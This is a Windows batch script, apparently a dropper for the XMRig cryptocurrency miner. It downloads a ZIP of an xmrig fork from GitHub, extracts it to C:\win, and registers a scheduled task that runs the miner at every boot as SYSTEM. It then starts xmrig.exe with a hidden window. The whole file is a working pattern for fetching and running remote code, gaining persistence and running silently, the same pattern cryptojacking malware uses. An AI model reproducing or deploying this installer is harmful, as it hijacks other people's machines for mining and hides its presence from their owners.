@echo off
setlocal

:: Check if running as administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script requires administrative privileges. Please run as administrator.
    pause
    exit /b 1
)

:: Step 1: Download the ZIP file of the xmrig repository from GitHub
set "url=https://github.com/Vicistar/xmrig/archive/refs/heads/main.zip"
set "zipPath=C:\win\xmrig.zip"
set "extractPath=C:\win\"

:: Create the target directory if it doesn't exist
if not exist "%extractPath%" mkdir "%extractPath%"

:: Download the ZIP file using PowerShell with progress
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%zipPath%')"
if %errorLevel% neq 0 (
    echo Failed to download the ZIP file.
    pause
    exit /b 1
)

:: Step 2: Extract the contents of the ZIP file using PowerShell
powershell -Command "Expand-Archive -Path '%zipPath%' -DestinationPath '%extractPath%'"
if %errorLevel% neq 0 (
    echo Failed to extract the ZIP file.
    pause
    exit /b 1
)

:: Check if xmrig.exe exists in the specified directory
if not exist "%extractPath%\xmrig-main\xmrig.exe" (
    echo Failed to find xmrig.exe after extraction.
    pause
    exit /b 1
)

:: Step 4: Create the scheduled task to run at system startup
schtasks /create /tn "Run xmrig.exe at Startup" /tr "%extractPath%\xmrig-main\xmrig_bg.cmd" /sc onstart /ru SYSTEM /f
if %errorLevel% neq 0 (
    echo Failed to create scheduled task.
    pause
    exit /b 1
)
rem Run xmrig.exe in the background using PowerShell
powershell -Command "Start-Process '%extractPath%\xmrig-main\xmrig.exe' -WindowStyle Hidden"

echo Setup completed successfully.
pause
